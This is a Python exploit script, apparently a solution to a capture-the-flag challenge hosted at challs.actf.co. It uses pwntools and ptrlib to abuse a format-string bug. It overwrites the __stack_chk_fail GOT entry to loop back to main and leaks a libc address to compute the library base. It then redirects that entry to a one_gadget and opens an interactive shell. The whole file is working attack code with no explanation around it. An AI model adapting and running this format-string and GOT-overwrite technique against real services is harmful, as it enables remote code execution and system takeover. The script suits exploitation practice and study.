#!/usr/bin/env python
import ptrlib as ptr
import sys
from pwn import context, fmtstr_payload, ELF

elf = ptr.ELF("./og_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")
context.binary = ELF(elf.filepath, checksec=False)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("challs.actf.co", 31312)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b"#%15$lx#"
    payload += fmtstr_payload(
        7,
        {elf.got("__stack_chk_fail"): elf.symbol("main")},
        numbwritten=2 * 6 + 2,
        write_size="int",
    )
    payload += b"O" * 0x10

    io.sendline(payload)
    io.recvuntil(b"#")
    libc.base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x29D90

    one_gadgets = [
        0xEBC81,
        0xEBC85,
        0xEBC88,
        0xEBCE2,
        0xEBD38,
        0xEBD3F,
        0xEBD43,
    ]

    payload = fmtstr_payload(
        6, {elf.got("__stack_chk_fail"): libc.base + one_gadgets[1]}, write_size="short"
    )
    payload += b"O" * 0x10

    io.sendline(payload)
    io.recvuntil(b"Gotta go. See you around, ")

    io.sendline(b"echo pwned!")
    io.recvuntil(b"pwned!")
    io.sh()


if __name__ == "__main__":
    main()
